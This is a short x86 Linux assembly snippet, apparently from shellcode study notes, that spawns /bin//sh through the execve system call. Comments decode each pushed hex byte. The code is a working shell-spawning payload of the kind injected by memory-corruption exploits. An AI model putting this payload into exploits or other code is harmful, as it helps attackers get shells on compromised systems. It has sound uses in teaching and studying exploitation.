.section .text
	xor    %eax,%eax
	push   %eax
	push   $0x68732f2f ;; 'h''s''/''/'
	push   $0x6e69622f ;; 'n''i''b''/'
	mov    %esp,%ebx
	push   %eax
	push   %ebx
	mov    %esp,%ecx
	mov    $0xb,%al ;; 0xb = 11 = execve()
	int    $0x80

	;; 0x2f = '/'
	;; 0x62 = 'b'
	;; 0x69 = 'i'
	;; 0x6e = 'n'
	;; 0x73 = 's'
	;; 0x68 = 'h'
	;; 0x68732f2f little-endian
	;; 0x6e69622f little-endian
